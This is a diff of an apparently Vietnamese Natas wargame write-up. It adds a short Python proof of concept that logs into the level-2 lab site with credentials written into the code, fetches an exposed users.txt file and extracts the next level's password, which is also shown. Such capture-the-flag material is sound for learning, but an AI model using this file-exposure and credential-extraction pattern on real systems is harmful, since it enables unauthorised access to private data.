@@ -95,3 +95,18 @@ Lúc này, chỉ cần xóa tên tệp và truy cập vào http://natas2.natas.l
 natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 ```
 
+**POC:**
+```Python
+import requests
+import re
+
+user = 'natas2'
+pwd = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
+
+url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % user
+reponse = requests.get(url,auth = (user,pwd))
+content = reponse.text
+
+#print(content)
+print(re.findall('natas3:(.*)', content))
+```
